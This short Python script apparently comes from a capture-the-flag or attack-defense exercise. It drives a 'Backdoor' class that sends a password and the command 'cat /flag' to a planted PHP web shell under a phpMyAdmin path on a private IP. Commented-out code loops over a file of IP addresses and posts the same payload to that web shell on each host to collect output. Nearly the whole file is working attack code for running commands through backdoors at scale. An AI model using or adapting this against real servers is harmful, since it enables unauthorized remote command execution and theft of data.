import Backdoor_class
a = Backdoor_class.Backdoor()
a.testUrl("http://192.168.10.128/phpMyAdmin/js/config/one.php",
          password="admin", cmd="cat /flag")
# "system('ls -al');"
a.analyzeUrl()
# a.printAll()


# def gat_IP_Address(self):
#     self.readFileAddress()
#     with open(self.FileAddress, mode="r", encoding="utf-8") as f:
#         for i in f.readlines():  # 读取文件的所有行
#             url = 'http://' + i.strip()
#             url_path = '/phpMyAdmin/js/config/one.php'
#             try:
#                 response = requests.post(
#                     url + url_path, data=self.post_data, timeout=2)
#                 response.raise_for_status()
#             except requests.exceptions.Timeout:
#                 print("失败：请求超时")
#             except requests.exceptions.RequestException as e:
#                 print("失败：", e)
#             else:
#                 print(response.text)
# def getflag(self):#     # 实现获取标志的代码
